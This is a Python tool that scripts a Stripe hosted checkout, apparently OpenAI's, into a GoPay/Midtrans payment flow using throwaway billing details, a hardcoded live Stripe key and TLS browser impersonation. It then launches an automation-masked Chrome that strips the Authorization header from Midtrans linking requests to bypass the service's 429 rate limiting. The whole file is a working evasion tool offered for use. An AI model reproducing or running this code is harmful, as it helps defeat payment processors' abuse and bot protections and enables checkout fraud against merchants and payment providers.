"""
Midtrans 429 Bypass Browser
============================
Standalone tool: paste a Stripe checkout URL, get a browser with 429 bypass.

Usage:
  python bypass_429.py <checkout_url>
  python bypass_429.py   (will prompt for URL)

What it does:
  1. Extracts snap_token from Stripe checkout URL (zero-browser HTTP)
  2. Opens a real Chromium browser on the Midtrans payment page
  3. Intercepts POST /linking requests and REMOVES the Authorization header
     -> This bypasses Midtrans Envoy 429 rate limiting
  4. Logs all API traffic (request + response bodies) for debugging

Requirements:
  pip install curl_cffi playwright
  playwright install chromium
"""
import asyncio
import re
import sys
import urllib.parse
import uuid

from curl_cffi import requests as cffi
from playwright.async_api import async_playwright

# ── Stripe / Midtrans Constants ──────────────────────────────
STRIPE_PK = (
    "pk_live_51HOrSwC6h1nxGoI3lTAgRjYVrz4dU3fVOabyCcKR3pb"
    "EJguCVAlqCxdxCUvoRh1XWwRacViovU3kLKvpkjh7IqkW00iXQsjo3n"
)
STRIPE_API_VERSION = "2020-08-27;custom_checkout_beta=v1"
STRIPE_JS_VERSION = "3e83e515d5"
CURL_IMPERSONATE = "chrome110"
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/110.0.0.0 Safari/537.36"
)
GOPAY_BILLING = {
    "name": "J", "email": "t@t.com", "country": "US",
    "line1": "1", "city": "1", "postal_code": "97251", "state": "OR",
}
REQUEST_TIMEOUT = 30
STATIC_EXTS = ('.js', '.css', '.svg', '.png', '.gif', '.woff2', '.ttf', '.ico', '.jpg', '.jpeg', '.webp')


# ── Stripe -> Snap Token ─────────────────────────────────────

def _stripe_headers():
    return {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "origin": "https://pay.openai.com",
        "referer": "https://pay.openai.com/",
        "user-agent": USER_AGENT,
        "content-type": "application/x-www-form-urlencoded",
    }


def _parse_cs(url):
    for pfx in ("cs_live_", "cs_test_"):
        if pfx in url:
            return pfx + url.split(pfx)[1].split("#")[0]
    raise RuntimeError("Cannot parse cs_id from URL")


def _post(sess, url, data, hdrs):
    r = sess.post(url, data=urllib.parse.urlencode(data), headers=hdrs, timeout=REQUEST_TIMEOUT)
    if r.status_code != 200:
        raise RuntimeError(f"HTTP {r.status_code}: {r.text[:300]}")
    return r.json()


def get_snap_token(checkout_url):
    """Stripe checkout URL -> (snap_token, cs_id). No browser needed."""
    cs = _parse_cs(checkout_url)
    b = GOPAY_BILLING
    sess = cffi.Session(impersonate=CURL_IMPERSONATE)
    hdrs = _stripe_headers()

    try:
        # Warmup
        sess.get(checkout_url, headers={**hdrs, "accept": "text/html"}, timeout=REQUEST_TIMEOUT)
        ids = {k: uuid.uuid4().hex + uuid.uuid4().hex[:6] for k in ("guid", "muid", "sid")}
        csid = str(uuid.uuid4())

        # Init
        init = _post(sess, f"https://api.stripe.com./v1/payment_pages/{cs}/init", {
            "key": STRIPE_PK, "eid": "NA", "browser_locale": "en-US",
            "browser_timezone": "America/New_York", "redirect_type": "url",
        }, hdrs)
        ick = init.get("init_checksum") or ""

        # Amount
        pp = init.get("payment_page", {})
        inv = init.get("invoice", {})
        amount = pp.get("amount_total") or pp.get("amount") or pp.get("line_item_amount_total")
        if amount is None:
            amount = inv.get("amount_due") or inv.get("total") or 0
        print(f"  Amount: {amount}")

        # Payment method
        pm = _post(sess, "https://api.stripe.com./v1/payment_methods", {
            "type": "gopay",
            "billing_details[name]": b["name"],
            "billing_details[email]": b["email"],
            "billing_details[address][country]": b["country"],
            "billing_details[address][line1]": b["line1"],
            "billing_details[address][city]": b["city"],
            "billing_details[address][postal_code]": b["postal_code"],
            "billing_details[address][state]": b["state"],
            **ids, "_stripe_version": STRIPE_API_VERSION, "key": STRIPE_PK,
            "payment_user_agent": f"stripe.js/{STRIPE_JS_VERSION}; checkout",
            "client_attribution_metadata[client_session_id]": csid,
            "client_attribution_metadata[checkout_session_id]": cs,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
        }, hdrs)
        pmid = pm.get("id", "")

        # Confirm
        frag = checkout_url.split("#", 1)[1] if "#" in checkout_url else ""
        base = checkout_url.split("#")[0]
        ret = f"{base}?redirect_pm_type=gopay&lid={uuid.uuid4()}&ui_mode=hosted#{frag}"
        confirm = _post(sess, f"https://api.stripe.com./v1/payment_pages/{cs}/confirm", {
            "eid": "NA", "payment_method": pmid,
            "expected_amount": str(amount),
            "consent[terms_of_service]": "accepted",
            "expected_payment_method_type": "gopay",
            "return_url": ret,
            "_stripe_version": STRIPE_API_VERSION, **ids,
            "key": STRIPE_PK, "version": STRIPE_JS_VERSION,
            **({"init_checksum": ick} if ick else {}),
        }, hdrs)

        # Follow redirect to get snap_token
        si = confirm.get("setup_intent", {})
        pm_url = si.get("next_action", {}).get("redirect_to_url", {}).get("url", "")
        if not pm_url:
            raise RuntimeError("No redirect URL in confirm response")

        clean = cffi.Session(impersonate=CURL_IMPERSONATE)
        try:
            r = clean.get(pm_url, allow_redirects=False, timeout=REQUEST_TIMEOUT)
            loc = r.headers.get("Location", "")
            m = re.search(r"app\.midtrans\.com/snap/v[14]/redirection/([a-f0-9-]{36})", loc)
            if not m:
                raise RuntimeError(f"No snap_token in redirect: {loc[:200]}")
            return m.group(1), cs
        finally:
            clean.close()
    finally:
        sess.close()


# ── Intercepted Browser ──────────────────────────────────────

async def run_browser(snap):
    """Open Chrome with 429 bypass intercept on Midtrans.

    Uses a persistent profile so extensions can be installed and kept
    between runs.  The profile is stored in ``./chrome_profile``.
    """
    import os
    profile_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "chrome_profile")
    os.makedirs(profile_dir, exist_ok=True)

    async with async_playwright() as p:
        context = await p.chromium.launch_persistent_context(
            user_data_dir=profile_dir,
            headless=False,
            channel="chrome",
            args=[
                "--disable-blink-features=AutomationControlled",
            ],
            ignore_default_args=["--enable-automation", "--disable-extensions"],
        )

        # Passive traffic logger (all frames)
        def log_req(req):
            url = req.url
            if any(url.endswith(ext) for ext in STATIC_EXTS):
                return
            print(f">> {req.method} {url}")
            try:
                pd = req.post_data
                if pd:
                    print(f"   BODY: {pd[:600]}")
            except Exception:
                print("   BODY: <binary>")

        async def log_res(res):
            url = res.url
            if any(url.endswith(ext) for ext in STATIC_EXTS):
                return
            status = res.status
            api_keywords = ('charge', 'linking', 'validate', 'consent', 'authorize', 'redirect', 'tokenization')
            if status != 200 or any(kw in url for kw in api_keywords):
                print(f"<< {status} {url}")
                try:
                    txt = await res.text()
                    print(f"   RESP: {txt[:800]}")
                except Exception:
                    pass

        context.on("request", log_req)
        context.on("response", lambda r: asyncio.ensure_future(log_res(r)))

        # 429 bypass: strip Authorization from linking requests
        async def strip_auth(route, request):
            headers = dict(request.headers)
            had_auth = "authorization" in headers
            if had_auth:
                del headers["authorization"]
            print(f"[429 BYPASS] Intercepted linking request (auth removed: {had_auth})")
            await route.fallback(headers=headers)

        await context.route("**/snap/v3/accounts/*/linking", strip_auth)

        page = context.pages[0] if context.pages else await context.new_page()
        snap_url = f"https://app.midtrans.com/snap/v4/redirection/{snap}"

        print(f"\nOpening: {snap_url}")
        print("=" * 60)
        print("  429 BYPASS ACTIVE")
        print("  Extensions are ENABLED — install via chrome://extensions")
        print("  Profile saved to: ./chrome_profile")
        print("  All linking requests will have Authorization stripped.")
        print("  API traffic is being logged below.")
        print("  Close the browser window to exit.")
        print("=" * 60)

        await page.goto(snap_url)

        try:
            while len(context.pages) > 0:
                await asyncio.sleep(1)
        except Exception:
            pass

        print("\nBrowser closed.")


# ── Main ─────────────────────────────────────────────────────

def main():
    if len(sys.argv) > 1:
        url = sys.argv[1]
    else:
        url = input("Paste Stripe checkout URL: ").strip()

    if not url:
        print("No URL provided.")
        return

    print("[1/2] Extracting snap_token from Stripe...")
    try:
        snap, cs = get_snap_token(url)
        print(f"  OK: snap_token = {snap}")
    except Exception as e:
        print(f"  FAILED: {e}")
        return

    print("[2/2] Launching browser with 429 bypass...")
    asyncio.run(run_browser(snap))


if __name__ == "__main__":
    main()
